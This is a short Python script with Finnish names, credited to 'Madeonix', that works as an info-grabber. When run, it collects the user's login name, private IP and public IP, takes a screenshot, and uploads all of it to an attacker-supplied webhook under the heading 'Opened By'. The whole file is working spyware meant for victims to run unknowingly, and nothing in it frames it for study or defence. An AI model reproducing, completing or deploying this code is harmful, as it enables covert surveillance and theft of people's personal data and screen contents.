import socket
import requests
import os
import pyautogui

def hae_osoite():
    try:
        hostname = "8.8.8.8"
        port = 80
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect((hostname, port))
            ip = s.getsockname()[0]
        return ip
        print(f"Osoite on: {ip}")
    except Exception as e:
        print(f"can't find anything: {e}")
    return None

ips = hae_osoite()
usernames = os.getlogin()

webhook_url = 'PASTE YOUR WEBHOOK URL HERE'

screenshot_path = "kuva.jpg"
pyautogui.screenshot().save(screenshot_path)


def hae_julkinen_ip():
    ipurl = 'https://api.ipify.org'
    try:
        response = requests.get(ipurl)
        response.raise_for_status()
        ipedi = response.text
        return ipedi
    except requests.exceptions.RequestException as e:
        print("voihan saakeli")
    return None

julkinen_ip = hae_julkinen_ip()


if ips and julkinen_ip:
    data = {
    "content": f"**Opened By: !**\n-> Name: `{usernames}`\n-> Private IP: `{ips}`\n-> Public IP: `{julkinen_ip}`\n**Made by Madeonix!**"

    }

    with open(screenshot_path, "rb") as file:
        files = {"file": file}
        response = requests.post(webhook_url, data=data, files=files)




if response.status_code == 204:
    print("working!")
else:
    print("doesn't work")

hae_osoite()

